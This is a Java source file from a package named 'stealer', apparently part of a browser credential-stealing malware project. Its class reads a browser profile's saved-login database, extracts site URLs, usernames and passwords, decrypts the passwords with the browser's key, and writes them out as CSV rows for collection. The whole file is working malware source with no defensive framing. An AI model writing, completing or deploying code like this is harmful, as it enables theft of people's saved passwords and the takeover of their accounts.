package com.github.shurpe.stealer.utils.browser.data;

import com.github.shurpe.stealer.utils.browser.BrowserProfile;
import com.github.shurpe.stealer.utils.Utils;

import java.sql.ResultSet;
import java.sql.SQLException;
import java.util.ArrayList;
import java.util.List;

public final class BrowserDataLogins extends BrowserData {

	public final static String CSV_HEADER = "Browser,URL,Username,Password,Creation Date,Last Use Date\n";

	private final List<Login> logins;

	public BrowserDataLogins(final BrowserProfile profile) {
		super(profile, "Login Data", "logins");

		this.logins = new ArrayList<>();
		this.findResultSets();
	}

	@Override
	public String toCsvColumn() {
		return super.toCsvColumn(logins);
	}

	@Override
	public void onResultSetFound(final ResultSet rs) {
		try {
			logins.add(new Login(rs, this.getProfile().getBrowser().getDecryptionKey()));
		} catch (SQLException ignored) {
		}
	}

	public static final class Login extends Data {

		private final String url, username, password;
		private final String creationDate, lastUseDate;

		public Login(final ResultSet rs, final byte[] decryptKey) throws SQLException {
			url = rs.getString("origin_url");
			username = rs.getString("username_value");
			password = Utils.getEncrypted(rs, "password_value", decryptKey);
			creationDate = Utils.getDate(rs, "date_created");
			lastUseDate = rs.getLong("date_last_used") != 0L ?
							Utils.getDate(rs, "date_last_used") : creationDate;
		}

		@Override
		public String toCsvColumn() {
			return '\"' + url + "\",\"" + username + "\",\"" + password + "\",\"" +
							creationDate + "\",\"" + lastUseDate + "\"\n";
		}
	}
}